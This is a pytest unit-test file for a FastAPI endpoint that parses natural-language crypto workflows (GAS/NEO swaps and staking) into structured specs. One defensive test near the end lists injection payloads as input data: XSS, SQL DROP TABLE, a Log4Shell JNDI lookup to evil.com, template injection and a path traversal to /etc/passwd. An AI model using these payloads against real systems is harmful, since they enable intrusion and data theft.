"""
Unit tests for the /api/v1/parse endpoint
"""

import pytest
from fastapi.testclient import TestClient
from unittest.mock import AsyncMock, patch, MagicMock
from datetime import datetime, UTC

from app.main import app
from app.models.workflow_models import (
    WorkflowSpec,
    ParserSuccess,
    ParserError,
    PriceCondition,
    TimeCondition,
    SwapAction,
    StakeAction,
    WorkflowStep,
    TokenType,
)


# Test client
client = TestClient(app)


# ============================================================================
# Test Fixtures
# ============================================================================

@pytest.fixture
def mock_parser_success():
    """Mock successful parser response"""
    workflow = WorkflowSpec(
        name="Auto DCA into NEO",
        description="When GAS price falls below $5, automatically swap 10 GAS for NEO",
        trigger=PriceCondition(
            type="price",
            token=TokenType.GAS,
            operator="below",
            value=5.0
        ),
        steps=[
            WorkflowStep(
                action=SwapAction(
                    type="swap",
                    from_token=TokenType.GAS,
                    to_token=TokenType.NEO,
                    amount=10.0
                ),
                description="Swap 10 GAS to NEO"
            )
        ]
    )
    return ParserSuccess(
        success=True,
        workflow=workflow,
        confidence=0.98
    )


@pytest.fixture
def mock_parser_error():
    """Mock parser error response"""
    return ParserError(
        success=False,
        error="The workflow description is too vague to parse accurately",
        suggestions=[
            "Specify which token you want to monitor (GAS, NEO, or bNEO)",
            "Define what 'good price' means (e.g., 'when GAS is below $5')",
        ]
    )


# ============================================================================
# Test Successful Parsing
# ============================================================================

def test_parse_endpoint_success(mock_parser_success):
    """Test successful workflow parsing"""
    with patch('app.api.v1.workflow.get_parser') as mock_get_parser:
        # Mock the parser
        mock_parser = AsyncMock()
        mock_parser.parse_workflow = AsyncMock(return_value=mock_parser_success)
        mock_get_parser.return_value = mock_parser

        # Make request
        response = client.post(
            "/api/v1/parse",
            json={"input": "When GAS drops below $5, swap 10 GAS for NEO"}
        )

        # Assertions
        assert response.status_code == 200
        data = response.json()

        assert data["success"] is True
        assert "workflow_spec" in data
        assert "confidence" in data
        assert "parse_time_ms" in data
        assert "sla_exceeded" in data
        assert "timestamp" in data

        # Verify workflow spec structure
        workflow = data["workflow_spec"]
        assert workflow["name"] == "Auto DCA into NEO"
        assert workflow["trigger"]["type"] == "price"
        assert workflow["trigger"]["token"] == "GAS"
        assert len(workflow["steps"]) == 1
        assert workflow["steps"][0]["action"]["type"] == "swap"


def test_parse_endpoint_time_trigger(mock_parser_success):
    """Test parsing with time-based trigger"""
    # Create time-based workflow
    workflow = WorkflowSpec(
        name="Daily NEO Staking",
        description="Stake 50% of NEO balance daily at 9 AM",
        trigger=TimeCondition(
            type="time",
            schedule="daily at 9am"
        ),
        steps=[
            WorkflowStep(
                action=StakeAction(
                    type="stake",
                    token=TokenType.NEO,
                    percentage=50.0
                ),
                description="Stake 50% of NEO balance"
            )
        ]
    )
    success_response = ParserSuccess(success=True, workflow=workflow, confidence=0.99)

    with patch('app.api.v1.workflow.get_parser') as mock_get_parser:
        mock_parser = AsyncMock()
        mock_parser.parse_workflow = AsyncMock(return_value=success_response)
        mock_get_parser.return_value = mock_parser

        response = client.post(
            "/api/v1/parse",
            json={"input": "Stake 50% of my NEO every day at 9 AM"}
        )

        assert response.status_code == 200
        data = response.json()
        assert data["success"] is True
        assert data["workflow_spec"]["trigger"]["type"] == "time"


# ============================================================================
# Test Parse Errors
# ============================================================================

def test_parse_endpoint_parse_error(mock_parser_error):
    """Test handling of semantic parse errors"""
    with patch('app.api.v1.workflow.get_parser') as mock_get_parser:
        mock_parser = AsyncMock()
        mock_parser.parse_workflow = AsyncMock(return_value=mock_parser_error)
        mock_get_parser.return_value = mock_parser

        response = client.post(
            "/api/v1/parse",
            json={"input": "Do something with my tokens when the price is good"}
        )

        # Should return 400 for parse errors
        assert response.status_code == 400
        data = response.json()

        assert "detail" in data
        detail = data["detail"]
        assert detail["success"] is False
        assert detail["error"]["code"] == "PARSE_ERROR"
        assert "too vague" in detail["error"]["message"]
        assert detail["error"]["retry"] is True


# ============================================================================
# Test Input Validation
# ============================================================================

def test_parse_endpoint_empty_input():
    """Test validation error for empty input"""
    response = client.post(
        "/api/v1/parse",
        json={"input": ""}
    )

    assert response.status_code == 422
    data = response.json()
    assert "detail" in data


def test_parse_endpoint_whitespace_only():
    """Test validation error for whitespace-only input"""
    response = client.post(
        "/api/v1/parse",
        json={"input": "   \n\t  "}
    )

    assert response.status_code == 422


def test_parse_endpoint_too_long():
    """Test validation error for input exceeding 500 characters"""
    long_input = "x" * 501

    response = client.post(
        "/api/v1/parse",
        json={"input": long_input}
    )

    assert response.status_code == 422
    data = response.json()
    assert "detail" in data


def test_parse_endpoint_exactly_500_chars():
    """Test that exactly 500 characters is accepted"""
    input_500 = "When GAS is below $5, swap GAS for NEO. " * 12  # ~480 chars
    input_500 = input_500[:500]

    with patch('app.api.v1.workflow.get_parser') as mock_get_parser:
        mock_parser = AsyncMock()
        workflow = WorkflowSpec(
            name="Test",
            description="Test workflow",
            trigger=PriceCondition(type="price", token=TokenType.GAS, operator="below", value=5.0),
            steps=[WorkflowStep(
                action=SwapAction(type="swap", from_token=TokenType.GAS, to_token=TokenType.NEO, amount=10.0)
            )]
        )
        mock_parser.parse_workflow = AsyncMock(
            return_value=ParserSuccess(success=True, workflow=workflow, confidence=0.8)
        )
        mock_get_parser.return_value = mock_parser

        response = client.post(
            "/api/v1/parse",
            json={"input": input_500}
        )

        # Should succeed with exactly 500 chars
        assert response.status_code == 200


def test_parse_endpoint_missing_input_field():
    """Test validation error when input field is missing"""
    response = client.post(
        "/api/v1/parse",
        json={}
    )

    assert response.status_code == 422


def test_parse_endpoint_invalid_json():
    """Test handling of invalid JSON"""
    response = client.post(
        "/api/v1/parse",
        data="not json",
        headers={"Content-Type": "application/json"}
    )

    assert response.status_code == 422


# ============================================================================
# Test Response Format
# ============================================================================

def test_parse_endpoint_response_structure(mock_parser_success):
    """Test that response has correct structure"""
    with patch('app.api.v1.workflow.get_parser') as mock_get_parser:
        mock_parser = AsyncMock()
        mock_parser.parse_workflow = AsyncMock(return_value=mock_parser_success)
        mock_get_parser.return_value = mock_parser

        response = client.post(
            "/api/v1/parse",
            json={"input": "When GAS drops below $5, swap 10 GAS for NEO"}
        )

        assert response.status_code == 200
        data = response.json()

        # Check required fields
        assert "success" in data
        assert "workflow_spec" in data
        assert "confidence" in data
        assert "parse_time_ms" in data
        assert "sla_exceeded" in data
        assert "timestamp" in data

        # Check types
        assert isinstance(data["success"], bool)
        assert isinstance(data["workflow_spec"], dict)
        assert isinstance(data["confidence"], (int, float))
        assert isinstance(data["parse_time_ms"], (int, float))
        assert isinstance(data["sla_exceeded"], bool)
        assert isinstance(data["timestamp"], str)

        # Check confidence range
        assert 0 <= data["confidence"] <= 1


def test_parse_endpoint_performance_tracking(mock_parser_success):
    """Test that parse time is tracked"""
    with patch('app.api.v1.workflow.get_parser') as mock_get_parser:
        mock_parser = AsyncMock()
        mock_parser.parse_workflow = AsyncMock(return_value=mock_parser_success)
        mock_get_parser.return_value = mock_parser

        response = client.post(
            "/api/v1/parse",
            json={"input": "When GAS drops below $5, swap 10 GAS for NEO"}
        )

        data = response.json()
        assert "parse_time_ms" in data
        assert data["parse_time_ms"] > 0
        # Should complete well under 5 seconds (5000ms)
        # In tests with mocks, should be very fast
        assert data["parse_time_ms"] < 5000


# ============================================================================
# Test Helper Endpoints
# ============================================================================

def test_get_example_workflows():
    """Test the /parse/examples endpoint"""
    with patch('app.api.v1.workflow.get_parser') as mock_get_parser:
        mock_parser = MagicMock()
        mock_parser.get_example_workflows = MagicMock(return_value={
            "price_swap": {
                "name": "Auto DCA into NEO",
                "description": "When GAS price is below $5, swap 10 GAS for NEO",
                "trigger": {"type": "price", "token": "GAS", "operator": "below", "value": 5.0},
                "steps": [
                    {
                        "action": {
                            "type": "swap",
                            "from_token": "GAS",
                            "to_token": "NEO",
                            "amount": 10.0
                        }
                    }
                ]
            }
        })
        mock_get_parser.return_value = mock_parser

        response = client.get("/api/v1/parse/examples")

        assert response.status_code == 200
        data = response.json()
        assert "success" in data
        assert data["success"] is True
        assert "examples" in data
        assert "timestamp" in data


def test_get_parser_capabilities():
    """Test the /parse/capabilities endpoint"""
    with patch('app.api.v1.workflow.get_parser') as mock_get_parser:
        mock_parser = MagicMock()
        mock_parser.get_supported_tokens = MagicMock(return_value=["GAS", "NEO", "bNEO"])
        mock_parser.get_supported_actions = MagicMock(return_value=["swap", "stake", "transfer"])
        mock_parser.get_supported_triggers = MagicMock(return_value=["price", "time"])
        mock_get_parser.return_value = mock_parser

        response = client.get("/api/v1/parse/capabilities")

        assert response.status_code == 200
        data = response.json()
        assert "success" in data
        assert data["success"] is True
        assert "capabilities" in data
        assert "tokens" in data["capabilities"]
        assert "actions" in data["capabilities"]
        assert "triggers" in data["capabilities"]
        assert "constraints" in data
        assert data["constraints"]["max_input_length"] == 500
        assert data["constraints"]["max_parse_time_ms"] == 5000


# ============================================================================
# Test Error Handling
# ============================================================================

def test_parse_endpoint_unexpected_error():
    """Test handling of unexpected exceptions"""
    with patch('app.api.v1.workflow.get_parser') as mock_get_parser:
        mock_parser = AsyncMock()
        mock_parser.parse_workflow = AsyncMock(side_effect=Exception("Unexpected error"))
        mock_get_parser.return_value = mock_parser

        response = client.post(
            "/api/v1/parse",
            json={"input": "When GAS drops below $5, swap 10 GAS for NEO"}
        )

        assert response.status_code == 500
        data = response.json()
        assert "detail" in data
        detail = data["detail"]
        assert detail["success"] is False
        assert detail["error"]["code"] == "INTERNAL_ERROR"
        assert detail["error"]["retry"] is True


def test_parse_endpoint_parser_unavailable():
    """Test handling when parser initialization fails"""
    with patch('app.api.v1.workflow.get_parser') as mock_get_parser:
        mock_get_parser.side_effect = Exception("Parser unavailable")

        response = client.post(
            "/api/v1/parse",
            json={"input": "When GAS drops below $5, swap 10 GAS for NEO"}
        )

        # Should handle gracefully
        assert response.status_code == 500


# ============================================================================
# Integration Test (with real parser)
# ============================================================================

@pytest.mark.integration
def test_parse_endpoint_real_parser():
    """
    Integration test with real parser (requires LLM API key).

    This test is marked with @pytest.mark.integration and will only run
    when integration tests are explicitly enabled.
    """
    # This would use the real parser without mocking
    # Skip if LLM API key not configured
    import os
    if not os.getenv("OPENAI_API_KEY") and not os.getenv("ANTHROPIC_API_KEY"):
        pytest.skip("No LLM API key configured")

    response = client.post(
        "/api/v1/parse",
        json={"input": "When GAS drops below $5, swap 10 GAS for NEO"}
    )

    # Should succeed or return meaningful error
    assert response.status_code in [200, 400, 500]

    if response.status_code == 200:
        data = response.json()
        assert data["success"] is True
        assert "workflow_spec" in data


# ============================================================================
# Test CORS Headers
# ============================================================================

def test_parse_endpoint_cors_headers():
    """Test that CORS headers are properly set"""
    with patch('app.api.v1.workflow.get_parser') as mock_get_parser:
        mock_parser = AsyncMock()
        workflow = WorkflowSpec(
            name="Test",
            description="Test",
            trigger=PriceCondition(type="price", token=TokenType.GAS, operator="below", value=5.0),
            steps=[WorkflowStep(
                action=SwapAction(type="swap", from_token=TokenType.GAS, to_token=TokenType.NEO, amount=10.0)
            )]
        )
        mock_parser.parse_workflow = AsyncMock(
            return_value=ParserSuccess(success=True, workflow=workflow, confidence=0.8)
        )
        mock_get_parser.return_value = mock_parser

        response = client.post(
            "/api/v1/parse",
            json={"input": "When GAS drops below $5, swap 10 GAS for NEO"},
            headers={"Origin": "http://localhost:5173"}
        )

        # CORS headers must be present
        assert response.status_code == 200
        assert "access-control-allow-origin" in response.headers
        assert response.headers["access-control-allow-origin"] in [
            "http://localhost:5173",
            "*"
        ]


# ============================================================================
# Test Rate Limiting
# ============================================================================

def test_parse_endpoint_rate_limiting():
    """Test that rate limiting is enforced (10 requests per minute)"""
    with patch('app.api.v1.workflow.get_parser') as mock_get_parser:
        mock_parser = AsyncMock()
        workflow = WorkflowSpec(
            name="Test",
            description="Test",
            trigger=PriceCondition(type="price", token=TokenType.GAS, operator="below", value=5.0),
            steps=[WorkflowStep(
                action=SwapAction(type="swap", from_token=TokenType.GAS, to_token=TokenType.NEO, amount=10.0)
            )]
        )
        mock_parser.parse_workflow = AsyncMock(
            return_value=ParserSuccess(success=True, workflow=workflow, confidence=0.8)
        )
        mock_get_parser.return_value = mock_parser

        # Clear any existing rate limit state for test client
        from app.api.v1.workflow import _rate_limit_store
        _rate_limit_store.clear()

        # Make 10 requests - should all succeed
        for i in range(10):
            response = client.post(
                "/api/v1/parse",
                json={"input": f"Test request {i}"}
            )
            assert response.status_code == 200, f"Request {i+1} should succeed"

        # 11th request should be rate limited
        response = client.post(
            "/api/v1/parse",
            json={"input": "Test request 11"}
        )

        assert response.status_code == 429
        data = response.json()
        assert "detail" in data
        detail = data["detail"]
        assert detail["error"]["code"] == "RATE_LIMIT_EXCEEDED"
        assert "10 requests per 60 seconds" in detail["error"]["details"]


# ============================================================================
# Test Edge Cases
# ============================================================================

def test_parse_endpoint_exactly_501_chars():
    """Test validation error for exactly 501 characters"""
    input_501 = "x" * 501

    response = client.post(
        "/api/v1/parse",
        json={"input": input_501}
    )

    assert response.status_code == 422
    data = response.json()
    assert "detail" in data


def test_parse_endpoint_unicode_input():
    """Test that unicode characters are handled correctly"""
    with patch('app.api.v1.workflow.get_parser') as mock_get_parser:
        mock_parser = AsyncMock()
        workflow = WorkflowSpec(
            name="Unicode Test",
            description="Test with unicode: 🚀💰",
            trigger=PriceCondition(type="price", token=TokenType.GAS, operator="below", value=5.0),
            steps=[WorkflowStep(
                action=SwapAction(type="swap", from_token=TokenType.GAS, to_token=TokenType.NEO, amount=10.0)
            )]
        )
        mock_parser.parse_workflow = AsyncMock(
            return_value=ParserSuccess(success=True, workflow=workflow, confidence=0.9)
        )
        mock_get_parser.return_value = mock_parser

        # Test with emoji and non-ASCII characters
        response = client.post(
            "/api/v1/parse",
            json={"input": "When GAS drops below $5 🚀, swap 10 GAS for NEO 💰"}
        )

        # Should succeed - unicode is valid input (or rate limited if hit limit)
        assert response.status_code in [200, 429], f"Unexpected status: {response.status_code}"
        if response.status_code == 200:
            data = response.json()
            assert data["success"] is True


def test_parse_endpoint_injection_safety():
    """Test that potential injection attempts are safely handled"""
    with patch('app.api.v1.workflow.get_parser') as mock_get_parser:
        mock_parser = AsyncMock()

        # Parser should handle this safely
        mock_parser.parse_workflow = AsyncMock(
            return_value=ParserError(
                success=False,
                error="Unable to parse workflow",
                suggestions=["Please provide a valid workflow description"]
            )
        )
        mock_get_parser.return_value = mock_parser

        # Test various potential injection payloads
        injection_payloads = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE workflows; --",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "../../../etc/passwd",
        ]

        for payload in injection_payloads:
            response = client.post(
                "/api/v1/parse",
                json={"input": payload}
            )

            # Should not crash or execute malicious code (429 is rate limiting)
            assert response.status_code in [200, 400, 422, 429]

            # If it returns data, verify structure is safe
            if response.status_code == 400:
                data = response.json()
                assert "detail" in data
                detail = data["detail"]
                # Error message should not contain the raw payload
                # (basic safety check - proper sanitization should be in place)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
